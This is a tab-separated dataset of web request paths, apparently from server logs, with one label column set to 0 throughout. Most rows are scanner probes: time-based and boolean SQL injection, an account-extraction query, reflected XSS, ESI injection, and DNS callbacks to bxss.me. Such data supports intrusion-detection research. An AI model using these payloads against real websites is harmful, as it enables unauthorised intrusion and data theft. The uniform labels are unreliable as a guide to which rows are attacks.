sentences	labels
/****/zjdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/gzdt/144.htm \r\n\r\n 	 0
/******/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/jquery.ellipsis.js \r\n\r\n 	 0
/vc' and 2*3*8=6*8 and '1blf'='1blf/**/lib/jquery/jquery.min.js \r\n\r\n 	 0
/***/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 0
/**********/system/2021/09/07'"/><img src=javascript:alert(810) /013447361.shtml \r\n\r\n 	 0
/************/template/jcse/110105008056111/http://bxss.me/t/fit.txt/images/main.css \r\n\r\n 	 0
/*******/b14227c.php \r\n\r\n 	 0
/(select(0)from(select(sleep(43.368)))v)/*' (select(0)from(select(sleep(43.368)))v) '"" (select(0)from(select(sleep(43.368)))v) ""*//******/ \r\n\r\n 	 0
//***********/ui/lib/easyui/plugins/jquery.panel.js \r\n\r\n 	 0
/****/zjdt/zjdt/zcwj/64.htm \r\n\r\n 	 0
/****/yd/yw_1280/\"javascript:void(0)\" \r\n\r\n 	 0
/xwzx' and 2*3*8=6*8 and 'dsfl'='dsfl/****/jtwxq/ \r\n\r\n 	 0
/*/server/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c \r\n\r\n 	 0
/****/web/search?channelid=299868%' and 7466=7466 and '%'='&perpage=1000 \r\n\r\n 	 0
/****/system/2021/09/01'""/><iframe src=javascript:alert(1822) /013442863.shtml \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4697)">?_=1630312101338 \r\n\r\n 	 0
/***********/userservice.aspx?dbid=5' and 6022=6150 and 'ljlo'='ljlo \r\n\r\n 	 0
/*********/20191202/javascript:void(0); \r\n\r\n 	 0
/***/zp-core/admin-upload.php?error=<script>alert(777)</script> \r\n\r\n 	 0
/**/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(488)</script>?_=1630311430045 \r\n\r\n 	 0
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 0
/'""()&%<acx><script >ikcd(9168)</script>/****/sgaj/ \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%') and 5833=1069 and '%'='&wbfileid=51419 \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/encrypt/jbase64.js \r\n\r\n 	 0
/****/zrbg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 0
/****/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 \r\n\r\n 	 0
/**/lznews/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/2021wlaqxcz/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/'.gethostbyname(lc('hitjz'.'uxsdohtfd5a3f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(103).chr(78).chr(105).chr(82).'/sgaj/ \r\n\r\n 	 0
/******/system/2021/03/13/javascript:void(); \r\n\r\n 	 0
/*******/3b1.php \r\n\r\n 	 0
/****/zfwjn/'""()&%<acx><script >u5ff(9486)</script>/1110/list.html \r\n\r\n 	 0
/**/system/2020/12/31/javascript:void(0); \r\n\r\n 	 0
/******/system/2019/09/26/012981580.shtml \r\n\r\n 	 0
/****/xxgkml/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/***/nbhd/opengovmsgbox.do?pageindex=1' waitfor delay '0:0:2&siteid=115&method=listgovmsgboxs&pagesize=15&appid=4 \r\n\r\n 	 0
/**/dj/info_37.aspx?itemid=1524 and 7436=2228 \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/****************/index_2.html \r\n\r\n 	 0
/******//537/4fv8d5zw/xhr_send?t=1629431587665 \r\n\r\n 	 0
/****/shzr/xfgj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/wp-content/******/rocked/jnk.php \r\n\r\n 	 0
/****/czgk/http://bxss.me/t/fit.txt?.jpg/gdyx/ \r\n\r\n 	 0
/****/zdlygk/bzxajgc' and 2*3*8=6*8 and 'snbh'='snbh/szss/plx.htm \r\n\r\n 	 0
/**********/system/2021/12/13/javascript:void(0); \r\n\r\n 	 0
//***********/jslib/grouppic/jquery.ad-gallery.js \r\n\r\n 	 0
/*******/js/setpassguardctrl?id=1 \r\n\r\n 	 0
/******/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 0
socket.gethostbyname('hitsg' 'bwttwtqg20814.bxss.me.')[3].to_s) '/**/images/result.css \r\n\r\n 	 0
/****/zfxxgk1/fdzdgknr/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm \r\n\r\n 	 0
/****/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 0
/****/system/2021/06/12/javascript:window.close(); \r\n\r\n 	 0
/****/ztly/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/**/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777) \r\n\r\n 	 0
/**********/system/<script>alert(924)</script>/013447361.shtml \r\n\r\n 	 0
/****/qywh/whhd/ \r\n\r\n 	 0
/*******/5/jquery.db_tabmotionbanner.min.js \r\n\r\n 	 0
/**********/system/2021/12/06/javascript:window.print() \r\n\r\n 	 0
/****/xxgknb/2009/list.html?new=0.23190916418329843<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/**/products/industrialmachinery/201505/t20150513_60352.html/*/-->'""></iframe></script></style></title></textarea><script >alert(83420)</script> \r\n\r\n 	 0
/****/zzxxgk/javascript:void(0); \r\n\r\n 	 0
/****/js/encrypt'||'/md5.js \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/**********/gnxw/? \r\n\r\n 	 0
/************/investment-advisory/0'xor(if(now()=sysdate(),sleep(9),0))xor'z-04-19/270.html \r\n\r\n 	 0
/***/slash-cms/index.php?mod=sl_pages&id=alert(777) \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml'||'_2127/jytabljg_2061/list.html \r\n\r\n 	 0
/*******/f4i1c.php \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/gczlzl/1.htm \r\n\r\n 	 0
/*******/ui/widgets/scrollup/js/jquery.scrollup.min.js \r\n\r\n 	 0
/***/index.php?title=acunetixtest4b89a5&action=submit \r\n\r\n 	 0
/****/20211027/javascript:void(0); \r\n\r\n 	 0
/*******/6dd2.php \r\n\r\n 	 0
/****/zfxxgk/bxss.me/t/xss.html? \r\n\r\n 	 0
/*******/68hkd9v.php \r\n\r\n 	 0
/******/jslib/urite/0""xor(if(now()=sysdate(),sleep(15),0))xor""z.js \r\n\r\n 	 0
/******/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 0
/script%' and 2*3*8=6*8 and '9kuy'!='9kuy%/*/1905151614057782.js \r\n\r\n 	 0
/**********/system/2021/12/12/javascript:void(0); \r\n\r\n 	 0
/'""()&%<acx><script >5il4(9325)</script>/********/jcse/110105008056111/16/images/catesearchbtn.js \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=bxss.me/t/xss.html? \r\n\r\n 	 0
/****/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 0
/****/xxgkml/zdmsxx/list.html?new=/xfs.bxss.me \r\n\r\n 	 0
/**/<img src="javascript:alert(4735)"> \r\n\r\n 	 0
/**/system/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/*****/system/2020/09/16/javascript:void(0); \r\n\r\n 	 0
/**/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
socket.gethostbyname('hitfy' 'bcwdaevf889b3.bxss.me.')[3].to_s) '/****/website.js \r\n\r\n 	 0
/*******/e78te.php \r\n\r\n 	 0
/****/swb/ltgsz.com?n=11') and 3458=(select 3458 from pg_sleep(5)) and ('vaje'='vaje \r\n\r\n 	 0
/*******/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/****/wdsjs/hfswsj<esi:include src=""http://bxss.me/rpb.png""/>/zmhdyc.html \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type[0]==2and 3 in &type[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1738801731')))>'0 \r\n\r\n 	 0
/****/zdlygk/ncwywfgz'||'/ycs/hlx/xmb_gzdxb.htm \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' and 1821=1821  \r\n\r\n 	 0
/************/template/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/jquery.autocomplete.js \r\n\r\n 	 0
/*********/web/viewer.html?file=/uploadimg/gqtb/2019063pdf') and 6656=6656 and ('owpf'='owpf \r\n\r\n 	 0
/**/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 0
/***/col5/index.html/<img src="javascript:alert(324)"> \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new=/xfs.bxss.me \r\n\r\n 	 0
/**********/system/2021/09/07'""/><img src=x onerror=alert(822)>/013447361.shtml \r\n\r\n 	 0
/**/sustainability/csrreports/ \r\n\r\n 	 0
/system'||'/********/js/newcalendar/wdatepicker.js \r\n\r\n 	 0
/***/index.php?do=search&search="><body onload=eval(alert(777)) ><!-- \r\n\r\n 	 0
/*******/9igf1b.php \r\n\r\n 	 0
/***/fiyo/?app=article&view=item31ab2"">alert(777)0ccba&id=186 \r\n\r\n 	 0
/**********/system/2021/12/03/javascript:window.close(); \r\n\r\n 	 0
/***/0/00/52/15/521554_798511.jpg \r\n\r\n 	 0
/**/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 0
/****/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
/****/zdlygk/\"javascript:void(0)\" \r\n\r\n 	 0
/****/gccb/wjwszzgc/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/sub_menu_bg.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(86439)</script> \r\n\r\n 	 0
/**/news/xwygx/202109/t20210930_317981.html and 1=1 \r\n\r\n 	 0
/**/business/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/**********/system/2021/11/11/javascript:void(); \r\n\r\n 	 0
/**/ui/lib/easyui/themes'||'/bootstrap/panel.css \r\n\r\n 	 0
/****/qyjbxx/gjjj/ \r\n\r\n 	 0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 0
/****/qzfwj/5619/5629/index.html \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477') and 8927=8927 and '1'='1&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/xxgknb/2012<esi:include src=""http://bxss.me/rpb.png""/>/list.html \r\n\r\n 	 0
/*****/20161031/javascript:void(0); \r\n\r\n 	 0
/****/web/search?page=2%') or 7878=2737 and '%'='&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/2021_mtgz/202105/t20210505_273338.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3731)</script>?_=1630312025768 \r\n\r\n 	 0
/*********/web/viewer.html?file=/uploadimg/gqtb/2019063pdf and 6656=6656 \r\n\r\n 	 0
/******/system/2018/01/18/javascript:window.close(); \r\n\r\n 	 0
/****/index.cfm?field="">alert(777) \r\n\r\n 	 0
/****/images/lists?cid=1 ) order by 1 desc,extractvalue(rand(),concat(0x7c,md5(982281901))) desc -- a \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/szss/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/xmb_gzdxb.htm \r\n\r\n 	 0
/system%' and 2*3*8=6*8 and 'ruw2'!='ruw2%/********/js/counter.js \r\n\r\n 	 0
/****/system/2017/03/02/javascript:window.close(); \r\n\r\n 	 0
/**/system/2021/10/31/javascript:void(0); \r\n\r\n 	 0
/****/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/***/fiyo/?app=article&view=item31ab2"">alert(777)0ccba&id=186 \r\n\r\n 	 0
/****/zjdt/czjs/zcwj/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 0
/****/20201223/javascript:void(0); \r\n\r\n 	 0
/**/system/2020/10/30/javascript:void(0); \r\n\r\n 	 0
/************/template/jcse/website<esi:include src=""http://bxss.me/rpb.png""/>.js \r\n\r\n 	 0
/**********/system/2017/10/17/012441833.shtml \r\n\r\n 	 0
/****/jgzn/if(now()=sysdate(),sleep(12),0)/mhw.htm \r\n\r\n 	 0
/**/system/2021/08/19/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/system/2017/11/10/javascript:window.print() \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%' and 5928=5928 and '%'='&wbfileid=51419 \r\n\r\n 	 0
/****/jsly/wlzb/201610/t20161014_103595.html' and 'x'='y \r\n\r\n 	 0
/****/system/2021/10/16/javascript:window.close(); \r\n\r\n 	 0
/****/gjzqq/index.html?continent=') and 7395=0560 and ('1'='1 \r\n\r\n 	 0
/******/system/2016/08/03/javascript:void(0); \r\n\r\n 	 0
/******/visitcount/visit.jsp/"><script>alert(5754)</script>?type=2&i_webid=1&i_columnid=131 \r\n\r\n 	 0
/****/gccb/qcgc/ \r\n\r\n 	 0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/wdsjs/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/zmhdyc.html \r\n\r\n 	 0
/****/20201118/javascript:void(0); \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=4979 \r\n\r\n 	 0
/*****/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 0
/**/system/2021/08/09/javascript:void(0); \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/'""()&%<acx><script >cfou(9843)</script>/result.css \r\n\r\n 	 0
/****/consultdetails/:http://bxss.me/t/xss.html? \r\n\r\n 	 0
/*****/system/2020/05/04/javascript:void(0); \r\n\r\n 	 0
/**********/system/2021/09/25/javascript:void(); \r\n\r\n 	 0
/****/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 0
/*/210719/bxss.me/t/xss.html? \r\n\r\n 	 0
/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 0
/*****/system/2021/11/28/javascript:window.print() \r\n\r\n 	 0
/****/system/2021/04/14/javascript:void(); \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 6521=6521 and '1'='1 \r\n\r\n 	 0
/****/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 0
/******/system/2016/12/08/javascript:window.close(); \r\n\r\n 	 0
/cgi-bin/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 0
/****/zjdt'||'/zjdt/gzdt/144.htm \r\n\r\n 	 0
/******/jslib/bxss.me/ckplayer.js \r\n\r\n 	 0
/****/xxgkzn/http://bxss.me/t/fit.txt.html \r\n\r\n 	 0
/******/index.php?title=acunetixtest492764&action=submit \r\n\r\n 	 0
/******/system/2021/06/09'""/>//</script//>//<svg/onload=alert(2377) width=100///>/013399706.shtml \r\n\r\n 	 0
/****/gccb/jcgc/images/ \r\n\r\n 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1%' and 6601=(select 6601 from pg_sleep(5)) and '%'='&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/****/category/zhongguoqiyejiaboluntan?page=1'"()&%<acu><script>9112(9131)</script> \r\n\r\n 	 0
/*******/payment/good.php \r\n\r\n 	 0
/****/wdsjs/http://bxss.me/t/fit.txt/zmhdyc.html \r\n\r\n 	 0
/******/languages/en/announce.lang.php \r\n\r\n 	 0
/****/xxgknb/2012/list'||'.html \r\n\r\n 	 0
/skin%' and 2*3*8=6*8 and 'r3gi'!='r3gi%/**/lib/jquery.js \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394 and 8738=2345-- sfoi \r\n\r\n 	 0
/***********/meizhoujiangtang%' and 2*3*8=6*8 and 'am6b'!='am6b%/index_6.html \r\n\r\n 	 0
/***/dsp_editcreative.cfm?attributes.siteid="">alert(777) \r\n\r\n 	 0
/******/resource/if(now()=sysdate(),sleep(12),0)/newcalendar/wdatepicker.js \r\n\r\n 	 0
/****/zdgz/2020_zdgz/202012/t20201216_265034.html and 1=1 \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 3573=6201 and '1'='1 \r\n\r\n 	 0
/****/欧盟?page=1'""()&%<acx><script >bxfm(9933)</script> \r\n\r\n 	 0
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 0
/vc' and 2*3*8=6*8 and '3kvq'='3kvq/**/widgets/scrollup/css/themes/image.css \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=-1) or 6352=4914#&token=1 \r\n\r\n 	 0
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 0
/**/ourbusiness/rdandmanufacture/201412/t20141210_22173.html and 1>1 \r\n\r\n 	 0
/****/zfxxgk/fdzdgknr/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/******/business-area/warehouse-services/2017-03-22/0""xor(if(now()=sysdate(),sleep(9),0))xor""z.html \r\n\r\n 	 0
/*****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
/****/qzfwj/5619/5631/\"javascript:void(0)\" \r\n\r\n 	 0
/************/http://bxss.me/t/fit.txt/jcse/110105008056111/16/images/catesearchbtn.js \r\n\r\n 	 0
/****/河南自贸区?page=1'""()&%<acx><script >pu1h(9188)</script> \r\n\r\n 	 0
/****/5541ploijji.php \r\n\r\n 	 0
/*****/system/2021/01/21'"/><iframe src=javascript:alert(1167)>/013323672.shtml \r\n\r\n 	 0
/******/system/2017/08/06/javascript:window.print() \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/mainframe/js.js/""><script>alert(4654)</script> \r\n\r\n 	 0
/***/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_a5de4870247a68693b47ac0f8b9c401b/><!--<textarea> \r\n\r\n 	 0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt/css.js \r\n\r\n 	 0
/******/resource/js/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/wdatepicker.js \r\n\r\n 	 0
/****/category/yanjiubaogao?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(67342)</script> \r\n\r\n 	 0
/****/web/search?channelid=254846&searchword=天津') and 9304=9304 and ('ymdd'='ymdd \r\n\r\n 	 0
/cgi-bin/*******/count.cgi \r\n\r\n 	 0
/****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 0
/******/resource/js/newcalendar/my97datepicker%' and 2*3*8=6*8 and 'scfw'!='scfw%.htm \r\n\r\n 	 0
/**/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/******/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/***/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 0
/****/jgzn/leader' and 2*3*8=6*8 and 'kanp'='kanp/mhw.htm \r\n\r\n 	 0
/***/2020/12/14/art_0""xor(if(now()=sysdate(),sleep(15),0))xor""z_223612.html \r\n\r\n 	 0
/****/zfwjn/1088/bxss.me/list.html \r\n\r\n 	 0
/**/p291255.pst \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(823)">?_=1630311603075 \r\n\r\n 	 0
/*******/e42.php \r\n\r\n 	 0
/**/setup/ \r\n\r\n 	 0
/******/sc/"><script>alert(49)</script> \r\n\r\n 	 0
/***/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/****/system/2021/11/13/javascript:window.close(); \r\n\r\n 	 0
/****/index.cfm?error.diagnostics="">alert(777) \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/hero_os/search?q="" onmouseover=alert(777) ="" \r\n\r\n 	 0
/**/api/alert(777) \r\n\r\n 	 0
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&websiteid= \r\n\r\n 	 0
/****/zjdt' and 2*3*8=6*8 and 'eodd'='eodd/zjdt/gzdt/144.htm \r\n\r\n 	 0
/****/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=1&i_columnid=1&i_webid=1 and 1>1 \r\n\r\n 	 0
/****/"><script>alert(61)</script> \r\n\r\n 	 0
/****/zdlygk' and 2*3*8=6*8 and 'y8rc'='y8rc/bzxajgc/gys.htm \r\n\r\n 	 0
/*******/hxb.php \r\n\r\n 	 0
/*/action/showinfo/?classid=if(now()=sysdate(),sleep(22),0)&id=10299 \r\n\r\n 	 0
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
/jsearchfront'""()&%<acx><script >uzie(9280)</script>/********/jcse/110105008056111/16/images/main.css \r\n\r\n 	 0
/**********/system/2021/11/02/javascript:window.close(); \r\n\r\n 	 0
/**/index.php?do=post&id=279&c=dt&a=goods& \r\n\r\n 	 0
/***/col195/index.html/"><script>alert(209)</script> \r\n\r\n 	 0
/*****/system/2021/11/21/javascript:window.close(); \r\n\r\n 	 0
/****/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 0
/*****/system/2019/11/06/javascript:void(); \r\n\r\n 	 0
/************/template/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/voice/voice.css \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/selectpick/'""()&%<acx><script >ap8q(9543)</script>.js \r\n\r\n 	 0
/******/n239584'||'/n239608/n239626/index.html \r\n\r\n 	 0
/***/goform/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1%') or 7298=7298 /*&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/dsp_dp_showmonth.cfm? 5=posn 1&datelong="">alert(777) \r\n\r\n 	 0
/**********/system/2021/06/30/javascript:window.close(); \r\n\r\n 	 0
/****/p/433209.html \r\n\r\n 	 0
/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= \r\n\r\n 	 0
/*******/f80uhq.php \r\n\r\n 	 0
/**/system/2021/07/31/012187653.shtml' and 'x'='y \r\n\r\n 	 0
/*******/fo7avb7.php \r\n\r\n 	 0
/************/search.do?params<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
